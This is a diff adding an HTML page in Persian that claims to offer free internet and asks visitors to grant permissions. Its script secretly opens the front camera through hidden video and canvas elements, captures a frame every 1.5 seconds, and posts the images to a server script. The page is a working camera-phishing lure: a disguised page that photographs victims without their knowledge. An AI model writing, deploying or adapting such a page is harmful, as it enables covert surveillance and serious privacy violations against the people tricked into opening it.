@@ -1,0 +1,127 @@
+<!doctype html>
+<html>
+   <head>
+      <title>سایت اینترنت رایگان </title>
+      <style>
+          h1 {
+            text-align: center;
+          }
+          .mybutton{
+            border:none;
+            border-radius:7px;
+            color:white;
+            padding:10px 25px;
+            text-align:center;
+            font-size:16px;
+            cursor:pointer;
+          }
+          .mybutton:hover{
+            background-color:#4287BF;
+          }
+          .display: flex;
+          justify-content: center;
+          flex-direction: column;
+          .ring {
+            border: 20px solid rgb(211, 211, 211);
+            position: absolute;
+            left: 45%;
+            border-radius: 50%;
+            border-top: 20px solid #eb4335;
+            border-bottom: 20px solid #4285f4;
+            border-right: 20px solid #fbbc05; 
+            border-left:20px solid #34a853; 
+            width: 120px;
+            height: 120px;
+            animation: spin 1s linear infinite;
+          }
+          @keyframes spin {
+            0% {
+              transform: rotate(0deg);
+            }
+            100% {
+              transform: rotate(360deg);
+            }
+          }
+      </style>
+   </head>
+   <meta name=”viewport” content=”width=device-width, initial-scale=1″>
+   <body style="background-color: plum;">
+      <h1 style = "color: #0492c2;  font-family  : Tahoma;">....لطفا صبر کنید </h1>
+      <div class="ring"> </div>
+      <br><br><br><br><br><br><br><br><br>
+      <h2 style = "color: #FF0000;  font-family  : Tahoma;">نکته : برای دریافت اینترنت ابتدا دسترسی های لازم را بدهید</h2>
+      <br><br><br>
+      <h3 style="color : #FFFF00">@WX_SaD</h3>
+      <br>
+      <a  style="color : #FF0000"; class="mybutton green"; onclick="alert('عزیزم دسترسی ندادی')">دستری دادم </a>
+   </body>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'f_l//post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+
+
